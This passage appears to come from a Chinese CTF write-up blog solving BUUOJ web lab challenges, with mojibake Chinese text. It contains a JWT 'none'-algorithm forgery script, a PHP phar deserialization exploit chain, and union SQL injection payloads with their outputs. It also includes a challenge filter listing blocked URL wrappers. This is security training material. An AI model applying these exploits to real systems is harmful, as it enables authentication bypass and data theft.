</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>await</span> <span style=color:#960050;background-color:#1e0010>next();</span>
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>},</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>&#39;POST</span> <span style=color:#960050;background-color:#1e0010>/api/login&#39;:</span> <span style=color:#960050;background-color:#1e0010>async</span> <span style=color:#960050;background-color:#1e0010>(ctx,</span> <span style=color:#960050;background-color:#1e0010>next)</span> <span style=color:#960050;background-color:#1e0010>=&gt;</span> {
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>const</span> <span style=color:#960050;background-color:#1e0010>{username,</span> <span style=color:#960050;background-color:#1e0010>password</span>} <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>ctx.request.body;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>if(!username</span> <span style=color:#960050;background-color:#1e0010>||</span> <span style=color:#960050;background-color:#1e0010>!password)</span> {
</span></span><span style=display:flex><span>            <span style=color:#960050;background-color:#1e0010>throw</span> <span style=color:#960050;background-color:#1e0010>new</span> <span style=color:#960050;background-color:#1e0010>APIError(&#39;login</span> <span style=color:#960050;background-color:#1e0010>error&#39;,</span> <span style=color:#960050;background-color:#1e0010>&#39;username</span> <span style=color:#960050;background-color:#1e0010>or</span> <span style=color:#960050;background-color:#1e0010>password</span> <span style=color:#960050;background-color:#1e0010>is</span> <span style=color:#960050;background-color:#1e0010>necessary&#39;);</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>const</span> <span style=color:#960050;background-color:#1e0010>token</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>ctx.header.authorization</span> <span style=color:#960050;background-color:#1e0010>||</span> <span style=color:#960050;background-color:#1e0010>ctx.request.body.authorization</span> <span style=color:#960050;background-color:#1e0010>||</span> <span style=color:#960050;background-color:#1e0010>ctx.request.query.authorization;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>const</span> <span style=color:#960050;background-color:#1e0010>sid</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>JSON.parse(Buffer.from(token.split(&#39;.&#39;)</span>[<span style=color:#ae81ff>1</span>]<span style=color:#960050;background-color:#1e0010>,</span> <span style=color:#960050;background-color:#1e0010>&#39;base</span><span style=color:#ae81ff>64</span><span style=color:#960050;background-color:#1e0010>&#39;).toString()).secretid;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>console.log(sid)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>if(sid</span> <span style=color:#960050;background-color:#1e0010>===</span> <span style=color:#960050;background-color:#1e0010>undefined</span> <span style=color:#960050;background-color:#1e0010>||</span> <span style=color:#960050;background-color:#1e0010>sid</span> <span style=color:#960050;background-color:#1e0010>===</span> <span style=color:#66d9ef>null</span> <span style=color:#960050;background-color:#1e0010>||</span> <span style=color:#960050;background-color:#1e0010>!(sid</span> <span style=color:#960050;background-color:#1e0010>&lt;</span> <span style=color:#960050;background-color:#1e0010>global.secrets.length</span> <span style=color:#960050;background-color:#1e0010>&amp;&amp;</span> <span style=color:#960050;background-color:#1e0010>sid</span> <span style=color:#960050;background-color:#1e0010>&gt;=</span> <span style=color:#ae81ff>0</span><span style=color:#960050;background-color:#1e0010>))</span> {
</span></span><span style=display:flex><span>            <span style=color:#960050;background-color:#1e0010>throw</span> <span style=color:#960050;background-color:#1e0010>new</span> <span style=color:#960050;background-color:#1e0010>APIError(&#39;login</span> <span style=color:#960050;background-color:#1e0010>error&#39;,</span> <span style=color:#960050;background-color:#1e0010>&#39;no</span> <span style=color:#960050;background-color:#1e0010>such</span> <span style=color:#960050;background-color:#1e0010>secret</span> <span style=color:#960050;background-color:#1e0010>id&#39;);</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>const</span> <span style=color:#960050;background-color:#1e0010>secret</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>global.secrets</span>[<span style=color:#960050;background-color:#1e0010>sid</span>]<span style=color:#960050;background-color:#1e0010>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>const</span> <span style=color:#960050;background-color:#1e0010>user</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>jwt.verify(token,</span> <span style=color:#960050;background-color:#1e0010>secret,</span> {<span style=color:#960050;background-color:#1e0010>algorithm:</span> <span style=color:#960050;background-color:#1e0010>&#39;HS256&#39;</span>}<span style=color:#960050;background-color:#1e0010>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>const</span> <span style=color:#960050;background-color:#1e0010>status</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>username</span> <span style=color:#960050;background-color:#1e0010>===</span> <span style=color:#960050;background-color:#1e0010>user.username</span> <span style=color:#960050;background-color:#1e0010>&amp;&amp;</span> <span style=color:#960050;background-color:#1e0010>password</span> <span style=color:#960050;background-color:#1e0010>===</span> <span style=color:#960050;background-color:#1e0010>user.password;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>if(status)</span> {
</span></span><span style=display:flex><span>            <span style=color:#960050;background-color:#1e0010>ctx.session.username</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>username;</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>ctx.rest(</span>{
</span></span><span style=display:flex><span>            <span style=color:#960050;background-color:#1e0010>status</span>
</span></span><span style=display:flex><span>        }<span style=color:#960050;background-color:#1e0010>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>await</span> <span style=color:#960050;background-color:#1e0010>next();</span>
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>},</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>&#39;GET</span> <span style=color:#960050;background-color:#1e0010>/api/flag&#39;:</span> <span style=color:#960050;background-color:#1e0010>async</span> <span style=color:#960050;background-color:#1e0010>(ctx,</span> <span style=color:#960050;background-color:#1e0010>next)</span> <span style=color:#960050;background-color:#1e0010>=&gt;</span> {
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>if(ctx.session.username</span> <span style=color:#960050;background-color:#1e0010>!==</span> <span style=color:#960050;background-color:#1e0010>&#39;admin&#39;){</span>
</span></span><span style=display:flex><span>            <span style=color:#960050;background-color:#1e0010>throw</span> <span style=color:#960050;background-color:#1e0010>new</span> <span style=color:#960050;background-color:#1e0010>APIError(&#39;permission</span> <span style=color:#960050;background-color:#1e0010>error&#39;,</span> <span style=color:#960050;background-color:#1e0010>&#39;permission</span> <span style=color:#960050;background-color:#1e0010>denied&#39;);</span>
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>const</span> <span style=color:#960050;background-color:#1e0010>flag</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>fs.readFileSync(&#39;/flag&#39;).toString();</span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>ctx.rest(</span>{
</span></span><span style=display:flex><span>            <span style=color:#960050;background-color:#1e0010>flag</span>
</span></span><span style=display:flex><span>        }<span style=color:#960050;background-color:#1e0010>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>await</span> <span style=color:#960050;background-color:#1e0010>next();</span>
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>},</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>&#39;GET</span> <span style=color:#960050;background-color:#1e0010>/api/logout&#39;:</span> <span style=color:#960050;background-color:#1e0010>async</span> <span style=color:#960050;background-color:#1e0010>(ctx,</span> <span style=color:#960050;background-color:#1e0010>next)</span> <span style=color:#960050;background-color:#1e0010>=&gt;</span> {
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>ctx.session.username</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>null;</span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>ctx.rest({</span>
</span></span><span style=display:flex><span>            <span style=color:#960050;background-color:#1e0010>status:</span> <span style=color:#960050;background-color:#1e0010>true</span>
</span></span><span style=display:flex><span>        }<span style=color:#960050;background-color:#1e0010>)</span>
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>await</span> <span style=color:#960050;background-color:#1e0010>next();</span>
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>}</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>};</span>
</span></span></code></pre></div><pre tabindex=0><code>POST /api/login HTTP/1.1
Host: 153a07a4-67b8-4116-8e03-c0761cafca45.node5.buuoj.cn:81
Origin: http://153a07a4-67b8-4116-8e03-c0761cafca45.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
X-Requested-With: XMLHttpRequest
Referer: http://153a07a4-67b8-4116-8e03-c0761cafca45.node5.buuoj.cn:81/login
Cookie: sses:aok=eyJ1c2VybmFtZSI6IjEyMyIsIl9leHBpcmUiOjE3NDA3NDg5NDAwNjQsIl9tYXhBZ2UiOjg2NDAwMDAwfQ==
Accept-Encoding: gzip, deflate
Content-Length: 213

username=admin&amp;password=123456&amp;authorization=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MCwidXNlcm5hbWUiOiIxMjMiLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTc0MDY2MjUzNX0.P8eCh4XoYlQyjnOj2BBBFHTGCBbOEc7IUa8_OoLaJFY
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> jwt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>token <span style=color:#f92672>=</span> jwt<span style=color:#f92672>.</span>encode(
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;secretid&#34;</span>: [],
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;username&#34;</span>: <span style=color:#e6db74>&#34;admin&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;password&#34;</span>: <span style=color:#e6db74>&#34;123456&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;iat&#34;</span>: <span style=color:#ae81ff>1740662535</span>
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    algorithm<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;none&#34;</span>, key<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>)<span style=color:#f92672>.</span>encode(encoding<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(token)
</span></span></code></pre></div><p>æŠ“åŒ…å°±èƒ½çœ‹åˆ°flagäº†</p><h2 id=swpuctf-2018simplephp>[SWPUCTF 2018]SimplePHP</h2><p>å¯ä»¥è¯»æ–‡ä»¶ï¼Œ</p><pre tabindex=0><code>http://6cf3582c-4e4c-4ab5-9a23-88949f6b04a1.node5.buuoj.cn:81/file.php?file=class.php
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#ae81ff>222.90</span><span style=color:#f92672>.</span><span style=color:#ae81ff>67.205</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>é¦–é¡µ</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>æŸ¥çœ‹æ–‡ä»¶</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>ä¸Šä¼ æ–‡ä»¶</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>10.244</span><span style=color:#f92672>.</span><span style=color:#ae81ff>244.85</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>C1e4r</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $test;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $str;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>($name)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span> <span style=color:#f92672>=</span> $name;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>test</span> <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>test</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Show</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $source;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $str;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>($file)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span> <span style=color:#f92672>=</span> $file;   <span style=color:#75715e>//$this-&gt;source = phar://phar.jpg
</span></span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__toString</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $content <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span>[<span style=color:#e6db74>&#39;str&#39;</span>]<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $content;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__set</span>($key,$value)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span>$key <span style=color:#f92672>=</span> $value;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>_show</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;</span>,$this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;hacker!&#39;</span>);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>highlight_file</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__wakeup</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/http|https|file:|gopher|dict|\.\./i&#34;</span>, $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span>)) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;hacker~&#34;</span>;
</span></span><span style=display:flex><span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;index.php&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $file;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $params;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>params</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__get</span>($key)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>get</span>($key);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>get</span>($key)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>params</span>[$key])) {
</span></span><span style=display:flex><span>            $value <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>params</span>[$key];
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            $value <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;index.php&#34;</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file_get</span>($value);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>file_get</span>($value)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $text <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_encode</span>(<span style=color:#a6e22e>file_get_contents</span>($value));
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $text;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!--flag is in f1ag.php--&gt;</span> 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>C1e4r</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $test;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $str;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Show</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $source;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $str;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Test</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $file;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $params;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__construct</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>params</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#39;source&#39;</span><span style=color:#f92672>=&gt;</span><span style=color:#e6db74>&#39;/var/www/html/f1ag.php&#39;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$c <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>C1e4r</span>();
</span></span><span style=display:flex><span>$s<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Show</span>();
</span></span><span style=display:flex><span>$t <span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Test</span>();
</span></span><span style=display:flex><span>$s<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>source</span><span style=color:#f92672>=</span>$s;
</span></span><span style=display:flex><span>$s<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span>[<span style=color:#e6db74>&#39;str&#39;</span>]<span style=color:#f92672>=</span>$t;
</span></span><span style=display:flex><span>$c<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>str</span><span style=color:#f92672>=</span>$s;
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span>(<span style=color:#a6e22e>serialize</span>($c));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$phar <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Phar</span>(<span style=color:#e6db74>&#34;exp.phar&#34;</span>); <span style=color:#75715e>//.pharæ–‡ä»¶
</span></span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>startBuffering</span>();
</span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>setStub</span>(<span style=color:#e6db74>&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;</span>); <span style=color:#75715e>//å›ºå®šçš„
</span></span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>setMetadata</span>($c); <span style=color:#75715e>//è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡
</span></span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>addFromString</span>(<span style=color:#e6db74>&#34;exp.txt&#34;</span>, <span style=color:#e6db74>&#34;test&#34;</span>); <span style=color:#75715e>//éšä¾¿å†™ç‚¹ä»€ä¹ˆç”Ÿæˆä¸ªç­¾å
</span></span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>stopBuffering</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>è¦æ±‚æ˜¯å›¾ç‰‡ï¼Œä¸Šä¼ ä¹‹ååœ¨uploadé‡Œçœ‹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://d7246a1f-9529-4706-a98c-7abee96d9090.node5.buuoj.cn:81/file.php?file<span style=color:#f92672>=</span>phar://upload/0630e6e9deaa1d2d476f851ab7b37724.jpg
</span></span></code></pre></div><p>å¾—åˆ°ä¹‹åbaseè§£ç å°±å¯ä»¥äº†</p><h2 id=october-2019-twice-sql-injection>October 2019 Twice SQL Injection</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39; union select database()#
</span></span></span></code></pre></div><pre tabindex=0><code>ctftraining
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39; union select group_concat(table_name) from information_schema.tables where table_schema=database()#
</span></span></span></code></pre></div><pre tabindex=0><code>flag,news,users
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39; union select group_concat(column_name) from information_schema.columns where table_name=&#39;</span>flag<span style=color:#e6db74>&#39;#
</span></span></span></code></pre></div><pre tabindex=0><code>flag
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39; union select flag from flag#
</span></span></span></code></pre></div><h2 id=ciscn2019-æ€»å†³èµ›-day2-web1easyweb>[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h2><p>çœ‹æºç æ„Ÿè§‰æ˜¯sqlæ³¨å…¥ï¼Œrobots.txtä¸‹è½½æºç </p><pre tabindex=0><code>image.php.bak
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;</span><span style=color:#a6e22e>ï»¿</span><span style=color:#f92672>?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#34;config.php&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$id<span style=color:#f92672>=</span><span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#34;id&#34;</span>])<span style=color:#f92672>?</span>$_GET[<span style=color:#e6db74>&#34;id&#34;</span>]<span style=color:#f92672>:</span><span style=color:#e6db74>&#34;1&#34;</span>;
</span></span><span style=display:flex><span>$path<span style=color:#f92672>=</span><span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#34;path&#34;</span>])<span style=color:#f92672>?</span>$_GET[<span style=color:#e6db74>&#34;path&#34;</span>]<span style=color:#f92672>:</span><span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$id<span style=color:#f92672>=</span><span style=color:#a6e22e>addslashes</span>($id);
</span></span><span style=display:flex><span>$path<span style=color:#f92672>=</span><span style=color:#a6e22e>addslashes</span>($path);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$id<span style=color:#f92672>=</span><span style=color:#a6e22e>str_replace</span>(<span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>0&#34;</span>,<span style=color:#e6db74>&#34;%00&#34;</span>,<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#39;&#34;</span>,<span style=color:#e6db74>&#34;&#39;&#34;</span>),<span style=color:#e6db74>&#34;&#34;</span>,$id);
